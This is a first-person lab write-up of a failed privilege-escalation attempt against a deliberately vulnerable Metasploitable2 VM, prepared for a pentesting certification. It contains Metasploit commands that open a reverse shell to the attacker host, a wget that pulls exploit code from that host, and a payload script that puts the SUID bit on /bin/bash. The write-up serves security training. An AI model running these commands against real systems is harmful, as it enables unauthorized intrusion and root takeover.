# Privilege Escalation Attempt: distccd Foothold → udev Netlink (CVE-2009-1185)

**Day:** 18
**Track:** eJPT prep — Host/Network Pentesting module
**Lab:** Isolated VirtualBox host-only network (vboxnet0)
**Attacker:** Kali VM — 192.168.56.102
**Target:** Metasploitable2 — 192.168.56.101

## Scope

All testing performed in an isolated, self-hosted lab against Metasploitable2,
a deliberately vulnerable training VM. No production or third-party systems
were involved.

## Objective

Both prior exploitation paths on this target (vsftpd backdoor, Samba
`usermap_script` — see the [Day 17 writeup](metasploitable2-two-cves-one-root.md))
landed directly at root, skipping privilege escalation entirely. This session
deliberately targeted a service known to hand back a low-privileged shell
instead, to practice the enumerate → identify → exploit privesc chain rather
than another one-shot root.

## Getting a low-privilege foothold

```
msf6 > use exploit/unix/misc/distcc_exec
msf6 > set RHOSTS 192.168.56.101
msf6 > set payload cmd/unix/reverse
msf6 > set LHOST 192.168.56.102
msf6 > run
```

Result: shell as `daemon`, not root — confirmed with `id`
(`uid=1(daemon) gid=1(daemon) groups=1(daemon)`).

TTY upgraded with the same trick used previously:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Manual enumeration

Checked each of the standard privesc angles by hand before reaching for any
automated tooling, to understand what's actually being looked for rather
than just reading a script's output:

```bash
sudo -l                                     # daemon not in sudoers — dead end
find / -perm -4000 -type f 2>/dev/null      # SUID binaries — nothing unusual
cat /etc/crontab; ls -la /etc/cron*         # nothing world-writable
uname -a                                    # Linux 2.6.24-16-server (2008)
ps aux | grep root                          # /sbin/udevd running as root, PID 2374
```

The combination of an old kernel (2.6.24) and `udevd` running as root pointed
toward a specific known class of vulnerability rather than a generic kernel
exploit search.

## Identifying the candidate CVE

```bash
searchsploit udev
searchsploit "linux kernel 2.6.24"
```

Both searches surfaced candidates for **CVE-2009-1185** — a udev netlink
local privilege escalation. The bug: udev listens on a netlink socket for
messages it assumes can only come from the kernel, but never verifies the
sender's PID actually is 0 (the kernel). Any local process can forge a
netlink message claiming kernel origin, with an embedded shell command in
place of a real device event — and since udev runs as root, that command
executes as root.

## First attempt — architecture mismatch

```bash
searchsploit -x linux_x86-64/local/9083.c
```

This PoC matched the exact kernel build string from recon output, but
failed to compile:
```
error: "Architecture Unsupported"
error: "This code was written for x86-64 target and has to be built as x86-64 binary"
```

`uname -a` confirmed the target is `i686` (32-bit) — the exploit was
x86-64-only. Lesson: check target architecture against an exploit's stated
requirements *before* compiling, not after.

## Second attempt — compiled, ran, no escalation

Switched to a 32-bit-compatible PoC:

```bash
wget http://192.168.56.102:8000/8572.c -O udev_exploit2.c
gcc udev_exploit2.c -o udev_exploit2
```

Compiled cleanly (one harmless warning about a missing trailing newline).
The exploit required udevd's PID as an argument and a payload script at a
fixed path:

```bash
printf '#!/bin/sh\nchmod 4777 /bin/bash\n' > /tmp/run
chmod +x /tmp/run
./udev_exploit2 2374
```

The exploit ran with no error output, but `/bin/bash` retained its original
permissions (`-rwxr-xr-x`, no SUID bit) — no privilege gain. Root cause not
fully diagnosed; likely a udev-version or netlink-group specific detail this
particular PoC doesn't account for.

## Third attempt — Metasploit module

```
msf6 > background
msf6 > use exploit/linux/local/udev_netlink
msf6 > set SESSION 2
msf6 > run
```

Two further issues surfaced:
- **LHOST defaulted to loopback** (`127.0.0.1`) instead of the Kali host IP
  — required an explicit `set LHOST 192.168.56.102`
- **NLPID autodetection failed** against the target session, with the
  module suggesting a manual lookup via `/proc/net/netlink`

Stopped here for the session before completing that manual lookup.

## Why this is being documented as-is

A stalled privilege escalation attempt is a realistic outcome, not a gap to
hide. The value in this session was the full diagnostic chain: recognizing
a low-priv shell was needed in the first place (unlike Days 16-17), enumerating
by hand rather than jumping to automated tooling, correctly matching a
kernel/process combination to a specific CVE, catching an architecture
mismatch independently, and — when the exploit didn't work — narrowing down
*why* across two different delivery mechanisms (manual PoC vs. Metasploit
module) rather than abandoning the attempt at the first failure.

## Takeaways

- **Foothold-then-escalate practice matters as its own skill.** Direct-to-root
  exploits (Days 16-17) don't exercise the enumeration → candidate
  identification → exploitation chain that privesc actually requires.
- **Architecture checks come before compilation, not after.** A kernel
  version match doesn't guarantee binary compatibility.
- **A CVE match on paper doesn't guarantee a working PoC.** Real-world exploit
  reliability varies by exact target configuration, even against a textbook
  vulnerable version.
- **Diagnosing exploit failure (wrong LHOST, autodetect failure, silent
  no-op) is a distinct, transferable skill** from running exploits that
  simply work.

## Next steps

Not pursuing this specific chain further for now — the enumeration →
candidate-identification → exploitation flow was the goal, and that was
demonstrated regardless of outcome. A future session may revisit with a
purpose-built privesc target (e.g. Kioptrix) for a cleaner result.
